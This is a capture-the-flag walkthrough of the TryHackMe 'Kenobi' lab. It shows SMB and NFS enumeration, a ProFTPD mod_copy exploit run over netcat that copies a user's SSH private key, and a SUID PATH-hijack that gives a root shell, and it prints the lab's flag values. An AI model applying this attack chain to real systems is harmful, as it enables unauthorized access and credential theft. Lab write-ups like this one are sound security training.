# Kenobi

```bash
export IP=10.10.63.26
```


## Scans

### Nmap
Command:
```bash
nmap -vv -sC -sV -oN scans/nmap.initial $IP
```

Open Ports found:
```
21 -- ftp
22 -- ssh
80 -- webpage
111 -- RPC -- Remote Procedure Call
139 -- smb
445 --smb
2049
```

/robots.txt
```
User-agent: *
Disallow: /admin.html
```
IT'S A TRAP


### Samba

**Samba** allows users to acces and use files, printers, and other commonly shared resources over the internet.
It is often referred to as a *network file system*.

Samba is based on the **SMB** protocol -- Server Message Block

This script scans for samba shares
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.63.26
```

found 3 shares, most importantly: `anonymous`

this connects to the samba client with the `anonymous` user, similar to the `ftp` command
```bash
smbclient //$IP/anonymous
```

found `log.txt` file inside shares

this command downloads the available shares, similar to `wget`
```bash
smbget -R smb://$IP/anonymous
```

`log.txt` shows that an id_rsa key for user `kenobi` exists

this nmap script enumerates port 111's file system, to show available mount points
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.63.26
```

found `/var` as available


### Gobuster
```bash
gobuster dir -u 10.10.63.26 -w /opt/directory-list-2.3-medium.txt
```

Found Directories:
```
/server-status -- 403
```

nothing useful


## Initial Access with ProFtpd

* **ProFtpd** is a free/open-source FTP server, compatible with Unix and Windows. It has shown vulnerabilities in past versions.

    - This machine is running proftpd v/1.3.5, vulnerable to the mod_copy module exploit

    - the mod_copy module implements the commands `SITE CPFR` and `SITE CPTO` to copy files/directories across a server

netcatting into the macine and using the mod_copy module to copy `kenobi`'s id_rsa
```bash
nc 10.10.63.26 21

SITE CPFR /home/kenobi/.ssh/id_rsa

SITE CPTO /var/tmp/id_rsa
```

mounting directory to our local machine
```bash
mkdir /mnt/kenobiNFS
sudo mount 10.10.64.26:/var /mnt/kenobiNFS
```

after copying id_rsa, remember to set file permission
```bash
chmod 600 id_rsa
```


## SSH into Machine
```bash
ssh -i id_rsa kenobi@10.10.63.26
```

**User Flag Found:** `d0b0f3f53b6caa532a83915e19224899`


## Privilege Escalation with Path Variable Manipulation

using the `find` command to look for files with elevated privileges
```bash
find / -perm -u=s -type f 2>/dev/null
```

and seeing `/usr/bin/menu` which runs the `curl` and `uname` command without a full path

PrivEsc Command:
```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

because we copied the /bin/sh shell, named it `curl`, and gave it the correct file permission/path...
running the `/usr/bin/menu`, and calling the `curl` binary would call our new shell instead

and since the file is being run as root, selecting option `1` gives a root shell

**Root Flag Found**: `177b3cd8562289f37382721c28381f02`

---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
